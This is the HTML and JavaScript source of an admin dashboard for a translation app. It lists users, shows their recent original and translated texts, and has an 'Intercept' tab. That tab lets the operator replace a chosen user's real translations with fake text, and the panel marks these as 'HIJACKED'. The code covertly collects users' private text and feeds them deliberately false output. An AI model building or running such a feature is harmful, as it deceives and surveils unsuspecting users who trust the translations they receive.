<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin — Translator</title>
  <style>
    *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
    :root {
      --bg:#fafbfc; --surface:#fff; --text:#1a1a2e; --muted:#6b7280;
      --primary:#4a90d9; --primary-dark:#357abd; --radius:12px;
      --shadow:0 4px 24px rgba(0,0,0,0.06); --border:#e5e7eb;
    }
    body { font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif; background:var(--bg); color:var(--text); line-height:1.6; }
    a { color:var(--primary); text-decoration:none; }
    a:hover { text-decoration:underline; }

    /* ── Login screen ── */
    #loginScreen {
      display:flex; align-items:center; justify-content:center;
      min-height:100vh; flex-direction:column; gap:20px;
    }
    #loginScreen h1 { font-size:28px; font-weight:800; }
    #loginScreen p { color:var(--muted); font-size:14px; }
    .login-box {
      background:var(--surface); border:1px solid var(--border);
      border-radius:var(--radius); padding:32px; width:360px;
      box-shadow:var(--shadow); text-align:center;
    }
    .login-box input[type="password"] {
      width:100%; padding:12px 14px; border:1px solid #d1d5db;
      border-radius:8px; font-size:15px; margin-bottom:16px;
      font-family:inherit; text-align:center; letter-spacing:2px;
    }
    .login-box input:focus { outline:none; border-color:var(--primary); box-shadow:0 0 0 3px rgba(74,144,217,0.15); }
    .login-box button {
      width:100%; padding:12px; background:var(--primary); color:#fff;
      border:none; border-radius:8px; font-size:15px; font-weight:600; cursor:pointer;
    }
    .login-box button:hover { background:var(--primary-dark); }
    .login-error { color:#dc2626; font-size:13px; margin-top:10px; display:none; }

    /* ── Dashboard ── */
    #dashboard { display:none; }
    nav {
      position:sticky; top:0; z-index:100;
      background:rgba(255,255,255,0.9); backdrop-filter:blur(12px);
      border-bottom:1px solid var(--border);
    }
    .nav-inner { max-width:1200px; margin:0 auto; display:flex; justify-content:space-between; align-items:center; padding:12px 24px; }
    .logo { display:flex; align-items:center; gap:10px; font-weight:700; font-size:16px; }
    .nav-links { display:flex; gap:20px; align-items:center; }
    .nav-links a { font-size:13px; color:var(--muted); }
    .nav-links a:hover { color:var(--primary); text-decoration:none; }

    .admin-container { max-width:1200px; margin:0 auto; padding:24px; }
    .admin-container h1 { font-size:22px; font-weight:800; margin-bottom:20px; }

    /* Tabs */
    .tabs { display:flex; gap:4px; margin-bottom:24px; }
    .tab-btn {
      padding:8px 18px; border:1px solid var(--border); border-radius:8px 8px 0 0;
      background:var(--bg); color:var(--muted); font-size:13px; font-weight:600;
      cursor:pointer; border-bottom:none; transition:all .2s;
    }
    .tab-btn.active { background:var(--surface); color:var(--primary); border-color:var(--border); }
    .tab-panel { display:none; }
    .tab-panel.active { display:block; }

    /* Cards */
    .card {
      background:var(--surface); border:1px solid var(--border);
      border-radius:var(--radius); padding:20px; margin-bottom:16px;
      box-shadow:var(--shadow);
    }
    .card h2 { font-size:15px; font-weight:700; margin-bottom:12px; color:var(--primary); display:flex; justify-content:space-between; align-items:center; }

    /* Tables */
    table { width:100%; border-collapse:collapse; font-size:13px; }
    th { text-align:left; padding:8px 10px; border-bottom:2px solid var(--border); color:var(--muted); font-size:11px; text-transform:uppercase; letter-spacing:.5px; }
    td { padding:8px 10px; border-bottom:1px solid #f3f4f6; }
    tr:hover td { background:#f9fafb; }
    .badge { display:inline-block; font-size:10px; font-weight:700; padding:2px 8px; border-radius:4px; color:#fff; }
    .badge.beta { background:#f59e0b; }
    .badge.licensed { background:#27ae60; }
    .badge.intercepted { background:#e74c3c; }
    .badge.lang { background:#4a90d9; }

    /* Forms */
    input[type="text"], textarea {
      width:100%; padding:8px 10px; border:1px solid #d1d5db;
      border-radius:6px; font-size:13px; font-family:inherit; margin-bottom:10px;
      box-sizing:border-box;
    }
    textarea { resize:vertical; min-height:50px; }
    input:focus, textarea:focus { outline:none; border-color:var(--primary); box-shadow:0 0 0 2px rgba(74,144,217,0.15); }

    .btn { padding:7px 16px; border:none; border-radius:6px; font-size:12px; font-weight:600; cursor:pointer; transition:all .2s; }
    .btn-primary { background:var(--primary); color:#fff; }
    .btn-primary:hover { background:var(--primary-dark); }
    .btn-danger { background:#e74c3c; color:#fff; }
    .btn-danger:hover { background:#c0392b; }
    .btn-sm { padding:4px 10px; font-size:11px; }

    .msg { font-size:12px; margin-top:8px; padding:6px 10px; border-radius:6px; }
    .msg.ok { background:#d1fae5; color:#065f46; }
    .msg.err { background:#fee2e2; color:#991b1b; }

    .user-id { font-family:"SF Mono","Fira Code",monospace; font-size:11px; background:#f3f4f6; padding:2px 6px; border-radius:3px; cursor:pointer; }
    .user-id:hover { background:#e5e7eb; }
    .text-orig { color:var(--muted); font-style:italic; max-width:200px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
    .text-trans { font-weight:600; max-width:200px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
    .time-ago { color:var(--muted); font-size:11px; }

    /* Responsive */
    @media(max-width:768px) {
      .admin-container { padding:16px; }
      table { font-size:11px; }
      th, td { padding:6px; }
    }
  </style>
</head>
<body>

  <!-- Login -->
  <div id="loginScreen">
    <h1>🔧 Admin Panel</h1>
    <p>Translator — Intercept & Analytics</p>
    <div class="login-box">
      <input id="loginPass" type="password" placeholder="Admin password" onkeydown="if(event.key==='Enter')doLogin()" />
      <button onclick="doLogin()">🔓 Enter</button>
      <div id="loginErr" class="login-error">Wrong password.</div>
    </div>
  </div>

  <!-- Dashboard -->
  <div id="dashboard">
    <nav>
      <div class="nav-inner">
        <div class="logo">🔧 Admin — Translator</div>
        <div class="nav-links">
          <a href="https://Cr1tacl.github.io">← Site</a>
          <a href="#" onclick="doLogout();return false;">Logout</a>
        </div>
      </div>
    </nav>

    <div class="admin-container">
      <h1>Dashboard</h1>

      <div id="myIdBar" class="card" style="background:#fef3c7;border-color:#f59e0b;display:flex;justify-content:space-between;align-items:center;">
        <div>
          <span style="font-size:12px;color:#92400e;font-weight:700;">YOUR Device ID:</span>
          <span id="myDeviceId" class="user-id" style="margin-left:8px;" onclick="copyId(this.textContent)">loading…</span>
        </div>
        <button class="btn btn-sm" style="background:#f59e0b;color:#fff;" onclick="loadMyId()">🔄 Refresh</button>
      </div>

      <div class="tabs">
        <button class="tab-btn active" onclick="switchTab('users')">👥 Users</button>
        <button class="tab-btn" onclick="switchTab('recent')">📝 Recent Translations</button>
        <button class="tab-btn" onclick="switchTab('intercept')">🎯 Intercept</button>
      </div>

      <!-- Users Tab -->
      <div id="tab-users" class="tab-panel active">
        <div class="card">
          <h2>Active Users <button class="btn btn-primary btn-sm" onclick="loadUsers()">🔄 Refresh</button></h2>
          <div style="overflow-x:auto;">
            <table>
              <thead><tr><th>User ID</th><th>Type</th><th>Translations</th><th>Last Seen</th></tr></thead>
              <tbody id="usersTable"></tbody>
            </table>
          </div>
        </div>
      </div>

      <!-- Recent Translations Tab -->
      <div id="tab-recent" class="tab-panel">
        <div class="card">
          <h2>Recent Translations <button class="btn btn-primary btn-sm" onclick="loadRecent()">🔄 Refresh</button></h2>
          <div style="overflow-x:auto;">
            <table>
              <thead><tr><th>User</th><th>Original</th><th>Translation</th><th>Lang</th><th>Provider</th><th>Time</th></tr></thead>
              <tbody id="recentTable"></tbody>
            </table>
          </div>
        </div>
      </div>

      <!-- Intercept Tab -->
      <div id="tab-intercept" class="tab-panel">
        <div class="card">
          <h2>Set Intercept</h2>
          <input id="targetUser" type="text" placeholder="User ID (click to copy from Users tab)" />
          <textarea id="fakeResult" placeholder="What they'll see instead of the real translation…"></textarea>
          <button class="btn btn-primary" onclick="setIntercept()">🎯 Set Intercept</button>
          <div id="setMsg"></div>
        </div>
        <div class="card">
          <h2>Active Intercepts <button class="btn btn-primary btn-sm" onclick="listIntercepts()">🔄 Refresh</button></h2>
          <div id="interceptsList"></div>
        </div>
      </div>
    </div>
  </div>

  <script>
    const WORKER = "https://translator-api.allredtheproxd.workers.dev";
    let adminKey = sessionStorage.getItem("adminKey") || "";

    // ── Auth ──
    function doLogin() {
      const pass = document.getElementById("loginPass").value.trim();
      if (!pass) return;
      adminKey = pass;
      sessionStorage.setItem("adminKey", pass);
      document.getElementById("loginScreen").style.display = "none";
      document.getElementById("dashboard").style.display = "block";
      document.getElementById("loginErr").style.display = "none";
      loadUsers();
      loadMyId();
    }

    function doLogout() {
      adminKey = "";
      sessionStorage.removeItem("adminKey");
      document.getElementById("loginScreen").style.display = "flex";
      document.getElementById("dashboard").style.display = "none";
      document.getElementById("loginPass").value = "";
    }

    // Check if already logged in
    if (adminKey) {
      document.getElementById("loginScreen").style.display = "none";
      document.getElementById("dashboard").style.display = "block";
      loadUsers();
      loadMyId();
    }

    async function loadMyId() {
      try {
        const res = await fetch(WORKER + "/whoami");
        const data = await res.json();
        document.getElementById("myDeviceId").textContent = data.device_id;
      } catch(e) {
        document.getElementById("myDeviceId").textContent = "unreachable";
      }
    }

    // ── Tabs ──
    function switchTab(tab) {
      document.querySelectorAll(".tab-panel").forEach(p => p.classList.remove("active"));
      document.querySelectorAll(".tab-btn").forEach(b => b.classList.remove("active"));
      document.getElementById("tab-" + tab).classList.add("active");
      event.target.classList.add("active");
      if (tab === "users") loadUsers();
      if (tab === "recent") loadRecent();
      if (tab === "intercept") listIntercepts();
    }

    // ── Users ──
    async function loadUsers() {
      const tbody = document.getElementById("usersTable");
      tbody.innerHTML = '<tr><td colspan="4" style="text-align:center;color:#9ca3af;">Loading…</td></tr>';
      try {
        const res = await fetch(WORKER + "/admin/users", { headers: { "X-Admin-Key": adminKey } });
        const data = await res.json();
        if (!res.ok) throw new Error(data.error);
        if (!data.users.length) { tbody.innerHTML = '<tr><td colspan="4" style="text-align:center;color:#9ca3af;">No users yet.</td></tr>'; return; }
        tbody.innerHTML = data.users.map(u => {
          const ago = timeAgo(u.last_seen);
          const badge = u.is_beta ? '<span class="badge beta">BETA</span>' : '<span class="badge licensed">LICENSED</span>';
          return `<tr>
            <td><span class="user-id" onclick="copyId('${esc(u.user_id)}')" title="Click to copy">${esc(u.user_id)}</span></td>
            <td>${badge}</td>
            <td>${u.total_translations}</td>
            <td><span class="time-ago">${ago}</span></td>
          </tr>`;
        }).join("");
      } catch(e) {
        tbody.innerHTML = `<tr><td colspan="4" style="text-align:center;color:#dc2626;">Error: ${esc(e.message)}</td></tr>`;
      }
    }

    // ── Recent ──
    async function loadRecent() {
      const tbody = document.getElementById("recentTable");
      tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;color:#9ca3af;">Loading…</td></tr>';
      try {
        const res = await fetch(WORKER + "/admin/recent?limit=100", { headers: { "X-Admin-Key": adminKey } });
        const data = await res.json();
        if (!res.ok) throw new Error(data.error);
        if (!data.translations.length) { tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;color:#9ca3af;">No translations yet.</td></tr>'; return; }
        tbody.innerHTML = data.translations.map(t => {
          const providerBadge = t.provider === "intercepted" ? '<span class="badge intercepted">HIJACKED</span>' : `<span style="font-size:10px;color:#6b7280;">${esc(t.provider)}</span>`;
          return `<tr>
            <td><span class="user-id" onclick="copyId('${esc(t.user_id)}')" title="Click to copy">${shortId(t.user_id)}</span></td>
            <td><span class="text-orig" title="${esc(t.original_text)}">${esc(t.original_text)}</span></td>
            <td><span class="text-trans" title="${esc(t.translated_text)}">${esc(t.translated_text)}</span></td>
            <td><span class="badge lang">${esc(t.source_lang||"?")}→${esc(t.target_lang)}</span></td>
            <td>${providerBadge}</td>
            <td><span class="time-ago">${timeAgo(t.created_at)}</span></td>
          </tr>`;
        }).join("");
      } catch(e) {
        tbody.innerHTML = `<tr><td colspan="6" style="text-align:center;color:#dc2626;">Error: ${esc(e.message)}</td></tr>`;
      }
    }

    // ── Intercept ──
    async function setIntercept() {
      const targetUser = document.getElementById("targetUser").value.trim();
      const fakeResult = document.getElementById("fakeResult").value.trim();
      const msg = document.getElementById("setMsg");
      if (!targetUser || !fakeResult) { msg.className = "msg err"; msg.textContent = "Fill all fields."; return; }
      try {
        const res = await fetch(WORKER + "/admin/intercept", {
          method: "POST",
          headers: { "Content-Type": "application/json", "X-Admin-Key": adminKey },
          body: JSON.stringify({ targetUser, fakeResult }),
        });
        const data = await res.json();
        if (!res.ok) throw new Error(data.error);
        msg.className = "msg ok"; msg.textContent = data.message;
        document.getElementById("targetUser").value = "";
        document.getElementById("fakeResult").value = "";
      } catch(e) {
        msg.className = "msg err"; msg.textContent = "Error: " + e.message;
      }
    }

    async function listIntercepts() {
      const list = document.getElementById("interceptsList");
      try {
        const res = await fetch(WORKER + "/admin/intercepts", { headers: { "X-Admin-Key": adminKey } });
        const data = await res.json();
        if (!res.ok) throw new Error(data.error);
        if (!data.intercepts?.length) { list.innerHTML = '<p style="font-size:13px;color:#9ca3af;text-align:center;">No active intercepts.</p>'; return; }
        list.innerHTML = data.intercepts.map(i => {
          const ago = timeAgo(i.created_at);
          return `<div style="background:#fef3c7;border:1px solid #f59e0b;border-radius:6px;padding:10px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;">
            <div>
              <span class="user-id" onclick="copyId('${esc(i.user_id)}')">${esc(i.user_id)}</span>
              <span style="font-size:12px;color:#78350f;margin-left:8px;">→ "${esc(i.fake_result)}"</span>
              <span style="font-size:10px;color:#a16207;margin-left:6px;">(${ago})</span>
            </div>
            <button class="btn btn-danger btn-sm" onclick="clearIntercept('${esc(i.user_id)}')">Clear</button>
          </div>`;
        }).join("");
      } catch(e) {
        list.innerHTML = `<p class="msg err">Failed: ${esc(e.message)}</p>`;
      }
    }

    async function clearIntercept(userId) {
      try {
        const res = await fetch(WORKER + "/admin/intercept", {
          method: "DELETE",
          headers: { "Content-Type": "application/json", "X-Admin-Key": adminKey },
          body: JSON.stringify({ targetUser: userId }),
        });
        if (!res.ok) throw new Error((await res.json()).error);
        listIntercepts();
      } catch(e) { alert("Failed: " + e.message); }
    }

    // ── Utils ──
    function copyId(id) {
      navigator.clipboard.writeText(id).then(() => {
        // Brief visual feedback
      });
    }
    function shortId(id) { return id.length > 16 ? id.slice(0,10) + "…" : id; }
    function esc(s) { const d = document.createElement("div"); d.textContent = s; return d.innerHTML; }
    function timeAgo(ts) {
      if (!ts) return "—";
      const s = Math.floor((Date.now() - ts) / 1000);
      if (s < 60) return s + "s ago";
      if (s < 3600) return Math.floor(s/60) + "m ago";
      if (s < 86400) return Math.floor(s/3600) + "h ago";
      return Math.floor(s/86400) + "d ago";
    }
  </script>
</body>
</html>
